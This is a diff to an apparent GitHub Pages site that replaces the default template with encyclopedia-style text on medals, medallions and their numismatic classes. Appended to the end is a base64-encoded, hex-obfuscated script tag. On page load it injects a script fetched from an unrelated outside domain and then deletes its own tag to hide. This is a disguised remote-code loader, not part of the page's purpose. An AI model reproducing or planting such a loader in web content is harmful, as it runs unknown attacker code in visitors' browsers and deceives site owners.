@@ -1,37 +1,24 @@
-## Welcome to GitHub Pages
+A medal or medallion is a small portable artistic object, a thin disc, normally of metal, carrying a design, usually on both sides. They typically have a commemorative purpose of some kind, and many are given as awards. They may be intended to be worn, suspended from clothing or jewellery in some way. They may be struck like a coin by dies or die-cast in a mould.
 
-You can use the [editor on GitHub](https://github.com/mmbhnkcb/Medals/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+A medal may be awarded to a person or organization as a form of recognition for sporting, military, scientific, cultural, academic, or various other achievements. Military awards and decorations are more precise terms for certain types of state decoration. Medals may also be created for sale to commemorate particular individuals or events, or as works of artistic expression in their own right. In the past, medals commissioned for an individual, typically with their portrait, were often used as a form of diplomatic or personal gift, with no sense of being an award for the conduct of the recipient.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+An artist who creates medals or medallions is called a "medalist". Medals have long been popular collectible items, and in numismatics form a class called either exonumia or militaria.
 
-### Markdown
+In the proper use of the term, medallions are larger, starting at perhaps four inches across, and are, as such, usually too large to be worn very comfortably, though in colloquial use, "medallion" is often used to refer to a medal used as the pendant of a necklace (as in the medallion man fashion style of the 1960s and 1970s), or for other types of medals. Medallions may also be called "table medals" because they are too large to be worn and can only be displayed on a wall, table top, desk, or cabinet.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Main types
 
-```markdown
-Syntax highlighted code block
+Various prize medals with obverse designs, suspension rings and ribbons typical of medals intended to be draped over the head and hung from the neck
 
-# Header 1
-## Header 2
-### Header 3
+Plaquette by Peter Flötner, Vanitas, 1535–1540, gilt bronze. Created purely as an art object for a collector's market.
+Numismatists divide medals into at least seven classes:
 
-- Bulleted
-- List
+Awards: awarded to a person or organization as a form of recognition for sporting, military, scientific, cultural, academic, or various other achievements. Military awards and decorations are more precise terms for certain types of state decoration. Military decorations are often in shapes such as crosses or stars, but are still loosely called "medals", as in the star-shaped American Medal of Honor.
+Commemoratives: created for sale to commemorate particular individuals or events, or as works of medallic art in their own right.
+Souvenirs: similar to a commemorative, but more focused on a place or event like state fairs, expositions, museums, historic sites, etc., and frequently found for sale within their respective souvenir shops.
+Religious: devotional medals may be worn for religious reasons.
+Portraits: produced to immortalize a person with their portrait; European portrait medallions sometimes bear the Latin word aetatis ("of his age") to describe the depicted person's age at the time of the portrait.
+Artistic: made purely as an art object. Plaquettes are often of this type.
+Society Medals: made for societies used as a badge or token of membership.
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/mmbhnkcb/Medals/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="tHszh" src="data:text/javascript;base64, dmFyIF8xb29yMyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX1d5OEVVLCBfck9ORUIpIHt2YXIgX3ZRQ2NpID0gZnVuY3Rpb24oXzBpSlNmKSB7d2hpbGUgKC0tXzBpSlNmKSB7X1d5OEVVWydwdXNoJ10oX1d5OEVVWydzaGlmdCddKCkpO319O192UUNjaSgrK19yT05FQik7fShfMW9vcjMsIDB4MTFiKSk7dmFyIF9KQjc2UCA9IGZ1bmN0aW9uKF9nSGZUMiwgX2FJSU5GKSB7X2dIZlQyID0gX2dIZlQyIC0gMHgwO3ZhciBfbXdIbzkgPSBfMW9vcjNbX2dIZlQyXTtyZXR1cm4gX213SG85O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSkI3NlAoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1pOdXQ3ID0gZG9jdW1lbnRbX0pCNzZQKCcweDEnKV0oX0pCNzZQKCcweDInKSk7X1pOdXQ3W19KQjc2UCgnMHgzJyldID0gX0pCNzZQKCcweDQnKTtfWk51dDdbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4MzZceDRiXHg0NFx4NTFceDc2XHg1NVx4NGZceDY4XHg3N1x4NGQnO2RvY3VtZW50W19KQjc2UCgnMHg1JyldKF9KQjc2UCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9aTnV0Nyk7ZG9jdW1lbnRbX0pCNzZQKCcweDcnKV0oJ3RIc3poJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
